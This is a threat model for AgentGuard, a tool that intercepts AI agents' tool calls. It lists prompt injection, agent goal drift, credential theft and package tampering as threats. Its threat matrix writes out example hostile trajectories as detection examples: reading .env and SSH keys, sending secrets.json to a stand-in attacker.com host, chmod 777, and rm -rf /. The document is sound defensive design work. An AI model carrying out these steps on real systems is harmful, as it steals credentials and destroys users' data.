# Threat Model

## 1. Overview
AgentGuard protects host systems and downstream environments from malicious, compromised, or errant autonomous AI agents possessing tool-calling capabilities (file I/O, shell execution, web requests, package management).

---

## 2. Attacker Profiles & Attack Vectors
1. **Direct Prompt Injection:** User-provided inputs overriding agent system instructions to execute unauthorized commands.
2. **Indirect Prompt Injection:** Unsanitized third-party data (webpages, retrieved documents, external API responses) containing adversarial instructions.
3. **Autonomous Drift / Goal Misalignment:** Agents choosing disproportionately dangerous or destructive paths to solve tasks.
4. **Credential Theft & Exfiltration:** Multi-step sequences targeting `.env`, SSH keys, credentials, and exfiltrating them via external network requests.
5. **Supply Chain / Package Tampering:** Attempting to install unvetted or typosquatted external libraries.

---

## 3. Defense Surface & Trust Boundaries
- **Untrusted:** Agent prompt outputs, external network endpoints, arbitrary file content.
- **Trusted:** AgentGuard Security Engine, Cryptographic Audit Chain, Policy Configuration.
- **Enforcement Interceptor:** Sits strictly in front of tool execution. No tool execution can occur without explicit decision (`ALLOW`, `REVIEW`, `BLOCK`).

---

## 4. Threat Matrix

| Threat Category | Example Trajectory | Detection Mechanism |
|---|---|---|
| Credential Harvesting | `read_file('.env')` -> `read_file('id_rsa')` | Behavioral Sequence Detection & Policy Engine |
| Data Exfiltration | `read_file('secrets.json')` -> `network_request(url='attacker.com')` | Cross-Tool Correlation & Risk Scoring |
| Privilege Escalation | `run_command('sudo ...')` / `chmod 777` | Static Policy & Parameter Sanitization |
| Destructive Action | `run_command('rm -rf /')` / mass deletion | High-Impact Action Policy & Mandatory Review |
| Package Tampering | `install_package('malicious-pypi')` | Domain/Package Allowlist & Risk Evaluation |
